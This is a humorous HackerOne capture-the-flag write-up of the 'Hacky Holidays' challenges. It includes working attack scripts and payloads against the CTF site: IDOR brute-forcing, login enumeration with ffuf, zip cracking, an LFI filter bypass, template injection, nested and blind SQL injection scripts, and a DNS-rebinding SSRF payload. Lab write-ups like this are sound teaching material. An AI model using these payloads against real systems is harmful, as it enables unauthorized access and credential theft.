# It's just a man on a mission

## Report Details
- **Report ID**: 1069388
- **URL**: https://hackerone.com/reports/1069388
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2020-12-31T18:34:27.299Z
- **Disclosed**: 2021-01-12T18:02:45.904Z

## Reporter
- **Username**: thezoomer
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: h1-ctf

## Vulnerability Information
Preface
---------------------
Like any other good stories, this adventure has also begun with a few (long) days of preparation leading up to the start of the challenge. Tools were sharpened, command lines were dusted-off and one-too-many cups of coffee were consumed. The morale was high and the designated day finally arrived.

*Was any of that believable?  If things go south I might as well just start writing novels..dope* 🧐

What really happened was, I started this CTF three days late. I knew about it, but a little bit of procrastination (quite a lot tbh) mixed with a couple of other factors made it so I wasn't going to partake in it. Until one day (on December 15th to be precise) I opened Slack and I saw a message from @cranelab.

{F1139389}

At this point, after briefly talking to him, I was like "~~fuck it~~ screw it let's do this". 
And it began. The build-up to it was a little less epic than what I made it sound in the first place but don't worry, it's gonna be a reoccurring theme in this story. Buckle up, grab some popcorns because this is the story of 12 long days (actually it's more than 12 but it sounds cooler if I say that) filled with successes, failures, pain, happiness, tears, \*insert more emotions\* and a bad green guy.


Flag1 - Robots.txt
---------------------
I mean, the title pretty much gives it away. We're presented with a single webpage with a message explicitly stating we're not wanted here (I thought of leaving but yeah there wouldn't be a story so I didn't). 
As a good rule of thumb, when there isn't any other clear input on the page, content discovery is always a safe option. I checked the page source code, nothing was there, so I proceeded to see if the [/robots.txt](https://hackyholidays.h1ctf.com/robots.txt) endpoint was available. Yes sir, first flag down and we now have a new endpoint for what seems to be the second flag.

`flag{48104912-28b0-494a-9995-a203d1e261e7}`

Flag2 - DOM Flag
---------------------
Following the clue from flag1 let's visit `/s3cr3t-ar3a` just to be greeted by a "Page Moved" message.

{F1139514}
*Do I know where to look?*🤔

I've tried a couple of options to actually get this flag, purely based on what made sense to me. From "common" hacker endpoints (`/1337`, 1337-encoded endpoints, etc...) to random changes to the current endpoint, but none of those worked. As a reminder from flag1, always check the page source of whatever you're looking at. This time around though, don't forget that everything that javascript changes/adds/updates before the page is fully loaded will not be present in the page source(Ctrl+U). By inspecting(Ctrl+Shift+I) the fully rendered page and quickly Ctrl+f-ing for `flag` we can clearly (not from the picture below) see our 2nd flag.

{F1139537}

`flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}`

Flag3 - People Rater
---------------------
Day3 - so far so good. It's a smooth ride in what is supposed to be the grinch's lair (yeah right 🤣). Something in the air makes me think it won't be this easy moving forward though. Only time will tell (I actually already know it won't be this easy cause I'm writing this after completing the CTF but yeah you get the point).
I can now see a bunch of blue buttons. By studying the behavior of the page we can see alerts popping up every time we click one of them and we also have the possibility to load more blue inputs. Let's analyze the GET request that happens every time we click one of these famous buttons.
```http
GET /people-rater/entry?id=eyJpZCI6NH0= HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
```
mmm...It looks like the `base64 encoded` id parameter is responsible for identifying a JSON object on the backend as we can observe from the response

```json
{"id":"eyJpZCI6NH0=","name":"Ruth Ward","rating":"Disgusting"}
```

The parameter itself decodes to `{"id":4}` and at this point is now pretty clear to me that we're facing an IDOR. The way we approach it can be different but I'll guide you through what I decided to do. 
The rain was pouring outside, my thoughts were pretty much syncing with the slow falling of the raindrops on the concrete balcony (idk what this means it just sounds like something you'd read in a book ). I decided to get the easy way out. Bruteforce it is. I prepared a quick script for [turbo-intruder](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)  that copies the behavior we just analyzed, cycle through a range of numbers and look for a flag in the responses

```python
import base64
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=100,
                           pipeline=False
                           )

    for i in range(0, 256):
        engine.queue(target.req, base64.urlsafe_b64encode("{\"id\":" + bytes(i) + "}"))


def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)
``` 

One response has notably more words, flag3 has now been secured!
```json
payload: {"id":1}
response: {"id":"eyJpZCI6MX0=","name":"The Grinch","rating":"Amazing in every possible way!","flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"}
```

`flag{b705fb11-fb55-442f-847f-0931be82ed9a}`

Flag4 -Swag Shop
---------------------
It's shopping time. I don't know why I should be supporting enemies' businesses but here I am. Here's the shop page.

{F1139607}

I won't lie I was feeling bougie and that 400$ snowball launcher didn't sound too bad. But unfortunately, we're not here for pleasure. After trying out the page functionalities we can see that in order to buy one of the objects we need login credentials. 
One thing that I like to do when I see a login form is quickly testing the POST `/login` request for a low-hanging SQLi vulnerability and *luckily* this was not the case. Both heuristic tests (spraying the inputs with characters such as `'` and `--` to see if something breaks or acts funny) and the sqlmap output confirmed it.
After analyzing the HTTP history for our target page we see that the backend is using an API base endpoint to execute significant operations (e.g. `/api/login` and `/api/purchase`). What could this mean? I didn't have an answer right away because I proceeded to procrastinate for a few hours like a good mature and disciplined adventurer would do. 

As soon as I got back on the page I thought of the advice I gave at the beginning of this story and proceeded to run a quick content-discovery with common API endpoints wordlist

```shell
~$ ffuf -w ~/tools/wordlists/seclists/Discovery/Web-Content/api/objects.txt -u "https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ" -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ
 :: Wordlist         : FUZZ: /home/thezoomer/tools/wordlists/seclists/Discovery/Web-Content/api/objects.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
:: Progress: [3132/3132] :: Job [1/1] :: 312 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
``` 

Bingo! At `/api/sessions` we now can access a JSON object full of what it looks like encoded sessions data. At first glance, one entry looks different because of the double `==` at the end of the string. The base64 decoded string looks like this:

```javascript
"{"user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="}"
```

Interestingly enough, we now have what it looks like a user identifier plus an encoded cookie that I don't really know what to do with. I've tried setting the cookie as a session cookie in my browser(both encoded and non) but the login form was not bypassed.
In hindsight, It's actually weird that the `/api/user` endpoint wasn't found from my content discovery process. Anyway, it took me just a little bit longer to figure out the possibility to hit said endpoint to get user info. What actually took me way longer than I'd like to admit is getting the right parameter name for the request. This is probably a lesson on why wordlists are widely used or maybe on paying attention to the data you're provided with. Either way, the user value we discovered previously was a clear example of a [UUID](https://en.wikipedia.org/wiki/Universally_unique_identifier). We can now craft the following request:

```http
GET /swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043 HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
```
To my surprise, the flag is actually in the response and there's no need to bypass any login or other forms of access control.
```json
{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}
```

`flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}`

Flag5 - Secure Login
---------------------
My wishes were fulfilled and flag5 is actually all about bypassing a login form😂. No other significant endpoints or interesting behaviors were discovered in the recon process. 

After, of course, ruling out SQLi as a possible vulnerability, I moved on to trying a good old login form spray. The hint to get this idea is right in front of us. The error message clearly says "Invalid Username". From a previous CTF(actually, it might have been one of Hacker101 challenges) I remembered that this is a clear sign of subsequent DB queries. If(and only if) the provided username exists, then a query to check for the  password validity is made. This allows an attacker to get both credentials by checking the error message for every request.

The `ffuf` command looks like this
```shell
ffuf -w ~/tools/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=test" -u https://hackyholidays.h1ctf.com/secure-login -mr "Invalid Username"
```
and once we get the valid username `access` we can repeat the process to get the password `computer`.
The challenge is not over as we're presented with the following page.

{F1139732}

We get the hint that something needs to be downloaded. Content discovery can't help us this time. Observing the admin cookie that was set after logging in I could see a base64 string that decoded to `{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}`. I tried the obvious solution consisting of changing the `admin` parameter to `true`, encoding the newly obtained string, and ultimately setting the **NEW** cookie. 

This actually worked(😮) and a .zip file was now available to download: `/my_secure_files_not_for_you.zip`. One final step was required since the archive was protected with a password. Searching the web for common tools used in CTFs I came across [fcrackzip](https://github.com/hyc/fcrackzip) and it worked perfectly.

```shell
fcrackzip -v -u -D -p rockyou.txt /my_secure_files_not_for_you.zip

password: hahahaha
```
Flag5 was successfully retrieved from the `flag.txt` file inside the archive. (Nice password choice)
Side note, the archive also had a rather NSFW picture of Mr. Grinch that almost got me fired from my workplace but I'll leave that story for another day.

{F1139824}

`flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}`

Flag6 - My Diary
---------------------
Day 6. Morale is still relatively high. The sun is shining, I'm feeling good. 🌞
The page for flag6 `/my-diary/?template=entries.html` looks like a normal calendar with some questionable reminders.
After throwing around ideas with my fellow friend crane, it looked like content discovery was once again the first step to solve this.
This is the source code I could retrieve by spraying the `template` parameter to get an LFI-type scenario. 
Valid `/my-diary/?template=index.php` endpoint:
```php
<?php
if( isset($_GET["template"])  ){
    $page = $_GET["template"];
    //remove non allowed characters
    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
    //protect admin.php from being read
    $page = str_replace("admin.php","",$page);
    //I've changed the admin file to secretadmin.php for more security!
    $page = str_replace("secretadmin.php","",$page);
    //check file exists
    if( file_exists($page) ){
       echo file_get_contents($page);
    }else{
        //redirect to home
        header("Location: /my-diary/?template=entries.html");
        exit();
    }
}else{
    //redirect to home
    header("Location: /my-diary/?template=entries.html");
    exit();
}
```

Luckily enough my source code review skills didn't let me down and after setting up a quick testing environment I tried to bypass the weak regex filtering in order to access the `admin.php` page. After many and many tries I came up with the following payload:
`/my-diary/?template=secretsecretadmin.phpadmin.phpadminadmin.php.phpadminadmin.php.php`

I was able to exploit the fact the two regex filters occurred *one after the other*.  It's quite complicated to put it into words but after writing it down it actually makes more sense. Oh well, onto the next one 🥶

`flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}`

Flag7 - Hate Mail Generator
---------------------
The grinch is allegedly launching a phishing campaign and I'm here supposed to be stopping it.
{F1139929}
*I don't know what's going on in this GIF just read the caption, it'll do*

The part that captured my interest was the already existing campaign. After clicking on it we can see how emails are generated

{F1139930}

This is screaming SSTI but we still don't know what we are actually supposed to include.
This time, I'll try not to dance around it. Yep, you guessed it. It's content discovery again.

`/evil-templates/templates`
{F1139927}

With this new info, we can make use of the `/hate-mail-generator/new` page and create our own malicious email.
We can't actually create a campaign "because we're out of credits" (who uses credits at all on a website in 2020 anyway) but `/hate-mail-generator/new/preview` will work just fine since it renders our manually injected payload.
Let's analyze the candidate request:

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Type: application/x-www-form-urlencoded

preview_markup=Hello+{{name}}&preview_data={"name":"Alice","email":"alice@test.com"}
```

We know the templates are added to our email by using the prefix `{{template:XXXX}}`. Directly injecting the payload in the `preview_markup`parameter doesn't work so I used the only other possible parameter (I had tested beforehand the possibility to add any custom values and properties to the `preview_data` parameter). This is what it looks like:

```http
preview_markup=Hello+{{name}}&preview_data={"name":"{{template:38dhs_admins_only_header.html}}","email":"alice@test.com"}
```
As expected the name placeholder is translated to `{{template:38dhs_admins_only_header.html}}` by the template engine and then it's recursively replaced by the actual admin-only header since access control was only enforced on the first "template substitution" cycle.

`flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`

Flag8 -Forum
---------------------
Day 8 update. I'm chilling but it's not an "I'm chilling" as powerful as a Day 1 "I'm chilling", you know what I mean? (probably not)

What a lovely forum we can see at `/forum`:

{F1139944}

There's a login functionality again and the actual posts and comments are uniquely identified by a number as we can see from `/forum/1/1`. I did try to bruteforce some hidden posts/comments with no luck.

It's discovery time all-over again! The green guy seems to love it damn.
After finding the following valid endpoint `https://hackyholidays.h1ctf.com/forum/phpmyadmin` we have to get valid credentials to access the DB manager interface.
This next step doesn't really have a logical connection to the rest and I know some people didn't love it. I wasn't really bothered by it to be completely honest. It keeps things spicy at least no? Maybe I'm just getting numb to emotions. Yeah, that's probably it. 😶
At the end of the day, it doesn't really matter.  I noticed a super old version of Jquery on the page but couldn't do anything with it. That's when someone (it may be cranelab again - don't quote me on this one) dropped a hint of having the source code stored somewhere.
[https://github.com/Grinch-Networks/](https://github.com/Grinch-Networks/)
When GitHub is involved, a wise old man once told me to always check past commits. Humans are humans(is that how the saying goes?) and they make mistakes. Well, he wasn't wrong:

{F1139956}

We can now access the database and we get the hashed password for the `grinch` user.
By inspecting the source code a little bit deeper we know it's an MD5-hashed password
```php
public static function getByLogin($username, $password){
        $d = Db::read()->prepare('select * from user where username = ? and password = ? LIMIT 1 ');
        $d->execute( array($username,md5($password)));
        return ( $d->rowCount() == 1 ) ? new User($d->fetch()) : false;
    }
```
Before proceeding to use `hashcat` to try and crack the hash I've tried to use online tools just to be sure. [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash) was actually able to crack it and we now have all we need to login into our forum.
`credentials-> grinch:BahHumbug`

A new post is now visible and the flag is right in there.

`flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`

Flag10 - Signup Manager
---------------------
You're probably wondering what happened to flag9. I don't really wanna talk about it. I now feel drained and don't even have jokes left in my inventory. Sad😢 (1 like 1 prayer thank you). Keep reading to know the truth.

This challenge was all about looking around and testing the functionalities already on the page. It's a normal login+signup form. Let's just dive into it.

{F1139967}

Once logged in as a random user we are presented with a useless page with useless info (you can probably see my pent-up anger in my typing).
A (not)old friend came to the rescue once again. Content discovery gave us a `README.md` file with some juicy pieces of information stored inside.
From this line `2) Move signupmanager.zip into the new directory and unzip it.` we now know of the existence of `/signup-manager/signupmanager.zip`. And we're back to reviewing source code. Honestly, I enjoyed it more than I expected so I'm not complaining. 

Having access to the FULL signup process and having the knowledge on how to create an admin user (`6) You can make anyone an admin by changing the last character in the users.txt file to a Y` from the `README.md` file) is now down to find a valid exploit after thoroughly understanding what's happening to the user data on the backend. This section especially allowed to me understand what my goal was:

```php
if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
            if (strlen($username) < 3) {
                $errors[] = 'Username must by at least 3 characters';
            } else {
                if (isset($all_users[$username])) {
                    $errors[] = 'Username already exists';
                }
            }
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            if (strlen($firstname) < 3) {
                $errors[] = 'First name must by at least 3 characters';
            }
            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            if (strlen($lastname) < 3) {
                $errors[] = 'Last name must by at least 3 characters';
            }
[...]
```

The best way to explain it is, imagine a container where you can store objects. No matter how big they are or how many you got, at the end of the process the amount of material inside the container will always be the same (weird analogy - I don't know what container would be able to do what I just explained). I had to find something that looked small but after being processed by this magical container, it had to expand in some way. And then it hit me. Math is a complex science. There are many ways to represent numbers and one of them fits our scenario perfectly . 

By setting the age of the user to `1e5` and a last name FULL of letters `Y` I had successfully created an admin user. 
```javascript
action=signup&username=jam&password=jam&age=1e7&firstname=jamjam&lastname=jamYYYYYYYYYYYYY
```
This happens because the string `1e5` matches all the criteria in place (it is indeed numeric and shorter than 4 digits). Once the server tries to write the number on the `user.txt` file though, it translates to its actual numeric value (`100000`). When all users are retrieved on the main page, only the first 113 characters for each one are used. The last character of our newly created user-string turns out to be a `Y` and admin privileges are granted. GGs! Flag acquired and we also get a link to access the next challenge. 

`flag{99309f0f-1752-44a5-af1e-a03e4150757d}`

Flag11 - Recon Server
---------------------
Let me preface this by saying:  this is by far the hardest challenge on this CTF. It drained me of anything that I had left, from hope to sleep to enjoyment to humor (nah I'm lying I'm still gonna crack some jokes here and there). Kudos to Adam for making this but at the same time, I don't really like you after this.😉 

Let's visit the page we discovered from finishing the previous challenge.

{F1140019}

After hopping around for a bit, `sqlmap` actually found an SQLi entry point in the hash parameter at `https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=jdh34k`. After dumping the DB I was left with nothing but insignificant crumbles.
I knew there was an API system in place by visiting the `/api/` endpoint but it looked like it could be accessed only within the internal network.
The hint dropped by Adam was a reference to the Inception movie (I'll come clean and say I've never watched the movie even though I knew the general plot. I'm sorry movies fanatics, I'll make up to you one day). 

{F1140022}

This is where I started talking to osama.alaa (big shoutout to him) and after bouncing ideas off each other for a while we came to the conclusion of SQLi inside an SQLi, hence the movie reference What is this sorcery? Uncharted territory, to say the least. I'll fast forward the next part because it's pretty boring but it took MANY hours to finally get a working query 

```sql
hash=' UNION SELECT "' UNION SELECT 'null.jpg',null,'../api/user?username=test&password=test'-- -",null,1-- -
```

This results in a broken image, but once we open it in a new tab and hit `/r3c0n_server_4fdk59/picture?data=` the payload decodes to `{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/user?username=test&password=test","auth":"e645ca4b7a504c524e2cc1fb44fe02cc"}`

This how we were able to achieve an SSRF to hit the `/api` endpoints. I *just* needed an SQLi inside another SQLi inside another SQLi inside another S....😓

The next steps consist of discovering what endpoint we could hit and the right parameters to use. Once that was out of the way, it was time to enumerate a valid user by sending requests to the `/api/user` endpoint. The tricky part and I have to shoutout @mcipekci for pointing me in the right direction, was using the `%` character in an SQL `LIKE` statement. This allows recursive queries to be made to enumerate our user. 

This is the resulting script:

```python
import requests
import re
from string import printable

base_username=''
base_password=''

def search_username(username):
    for c in printable:
        if c == '_' or c == '%':
            c = "\\" + c
        r=requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=\' UNION SELECT "\' UNION SELECT \'null.jpg\',null,\'../api/user?username={}{}%\'-- -",null,1-- -'.format(username,c))
        regex=re.search('data=.*\"', r.text)
        data_param=regex.group(0)
        data_param = data_param[:-1]
        r2=requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?{}'.format(data_param))
        
        if r2.text.find("Invalid content type detected") != -1:
            username += c
            print("new char found: " +username)
            search_username(username)

def search_password(password):
    for c in printable:
        if c == '_' or c == '%':
            c = "\\" + c
        r=requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=\' UNION SELECT "\' UNION SELECT \'null.jpg\',null,\'../api/user?password={}{}%\'-- -",null,1-- -'.format(password,c))
        regex=re.search('data=.*\"', r.text)
        data_param=regex.group(0)
        data_param = data_param[:-1]
        r2=requests.get('https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?{}'.format(data_param))
        
        if r2.text.find("Invalid content type detected") != -1:
            password += c
            print("new char found: " +password)
            search_password(password)

#search_username(base_username)
search_password(base_password)
```
The credentials returned are _grinchadmin:s4nt4sucks_

We can now login into the attack-box, get the flag number 11 and move on to the 12th and last(ish) challenge.

`flag{07a03135-9778-4dee-a83c-7ec330728e72}`

Flag12 - Attack Box
---------------------
My body and my spirit were put under unimaginable pressure after flag11. Nothing could faze me any longer. I think this what it feels like to reach nirvana. A completely different and better perspective on life was provided to me, so without further ado, let's bring this adventure to an end.

{F1140046}

The Grinch is planning to take down Santa's servers and our goal is to plan a counterattack by taking him down instead. Honestly, it was like a walk in the park (it actually wasn't but it fits the narrative so Imma just run with it). Between a chess match with Buddah and a poker session with a couple of greek gods (I told you I was on a whole different level at this point no?) I was able to inspect the HTTP request responsible for starting a DDoS attack.

```http
GET /attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ== HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Cookie: attackbox=d09d508e78f3975e0199a5e91dde9687
```

It was time to crack the hash to get a hold of the situation. As confirmed by H1 it was indeed a salted hash. I came to the (pretty obvious) conclusion that the target IP was the variable and I tried to  crack the salt using `hashcat`

{F1140048}

Success! We now know the hash is a salted md5($pass.$salt) → [ip].mrgrinch463.
We can now craft whatever payload we want, thus being able to choose the target IP to attack. I quickly tried to use `localhost` in all its shapes and forms but there was an SSRF protection to bypass.
After trying every possible encoding (hex,octa,binary you name it) I stumbled across a common technique known as [DNS rebind](https://en.wikipedia.org/wiki/DNS_rebinding) and an amazing tool [rbndr](https://github.com/taviso/rbndr).
In hindsight, the hint was always there. The fake command-line messages appeared in succession and a better eye would have spotted the vulnerability right away. We basically exploit the fact that the remote host lookup and then the actual attack occur in two separate time frames. This is ideal for [TOCTOU attacks](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use). 

I finally got a working payload that looks like this: 
```javascript
{"target":"cb007121.7f000001.rbndr.us","hash":"aa9c061c933f709acb4d69329bc7b1af"}
```
The host lookup is not gonna fail since that domain instantly resolved to a valid public IP (I used one of Santa's, hope he doesn't mind) but a short TTL allows it to resolve to `127.0.0.1` shortly after.

The grinch is defeated as the page we're redirected to show us.

{F1140049}

I can now go back to finishing my discussion with Gandhi and Muhammad Ali, I left them hanging. Peace✌️

`flag{07a03135-9778-4dee-a83c-7ec330728e72}`

Flag9 - Evil Quiz
---------------------
I hate giving this challenge attention but here we go. I say that because for the longest time I thought it was a time-based blind SQLi using the `name` param. So yeah I'm pissed at myself for being slow and wasting a lot of time on it (the server was slow too at times so can we have a 50/50?). Having solved flag11 before flag9 allowed me to pretty much speedrun through this one though. The idea here is very similar and all I had to do was change the script from flag11 and craft a new payload for what I now know is a **BOOLEAN-BASED BLIND SQLi**.  Here it is:

```python
import requests
import re
from string import printable

base_username=''
base_password='s3cret\_p4ssw0rd-'

headers= { "Content-Type" : "application/x-www-form-urlencoded" }
cookies= { "session" : "fa3c1dba251b1de924de64d2322c446f" }

def search_username(username):    
    for c in printable:
        if c == '_' or c == '%':
            c = "\\" + c
        post_data = { "name" : "admin' and EXISTS (SELECT * FROM admin WHERE username LIKE '{}{}%') -- -".format(username,c) } 
        r=requests.post('https://hackyholidays.h1ctf.com/evil-quiz', data = post_data, headers=headers, cookies=cookies)
        r2=requests.get('https://hackyholidays.h1ctf.com/evil-quiz/score', cookies=cookies)
        if r2.text.find("is 0 other player(s)") == -1:
            username += c
            print("new char found: " +username)
            search_username(username)

def search_password(password):
    for c in printable:
        if c == '_' or c == '%':
            c = "\\" + c
        post_data = { "name" : "admin' and EXISTS (SELECT * FROM admin WHERE username LIKE 'admin' and password LIKE '{}{}%') -- -".format(password,c) } 
        r=requests.post('https://hackyholidays.h1ctf.com/evil-quiz', data = post_data, headers=headers, cookies=cookies)
        r2=requests.get('https://hackyholidays.h1ctf.com/evil-quiz/score', cookies=cookies)
        if r2.text.find("is 0 other player(s)") == -1:
            password += c
            print("new char found: " +password)
            search_password(password)
        
        

search_username(base_username)
search_password(base_password)
```
Credentials: _admin:S3creT_p4ssw0rd-$_
Flag is secured! Quick side note: I learned that using `LIKE BINARY  'strin%'` statements allows you to have a case sensitive query (crucial for this challenge)

` flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`


Prologue
---------------------
What can I say, what I thought was going to be another normal CTF event turned out to be much much more.
The Grinch is out and I evolved. It's a win-win in my books
Every story has an end and this is it. Here's a closing selfie I took right before writing this report/story/novel. Hope you enjoy it (I'm the one in the middle if it wasn't clear)

*Legal disclaimer: my lawyer wanted me to say this.*
 *No drugs or any other illegal substances were used in the process of writing this report (or in any other moment per say)*

{F1140052}



On a serious note though,
I had a blast and thanks to Adam, @nahamsec, and everyone else involved for making this. Shoutout also to my partner in crime @cranelab.
Hope you all had a good laugh reading this and I wish you all the best.

I'm out,
@thezoomer

## Impact

Depending on what side you're on, impact may vary. Use with caution.

## Attachments
- first_message.png
- flag2_1.png
- Flag2_2.png
- flag4_1.png
- flag5_1.png
- flag5_2.png
- flag7_1.png
- tenor.gif
- flag7_2.png
- flag8_1.png
- flag8_2.png
- flag10_1.png
- flag11_1.png
- flag11_2.jpg
- flag12_1.png
- flag12_2.png
- Screenshot_2020-12-27_143330.png
- epilogue.jpg
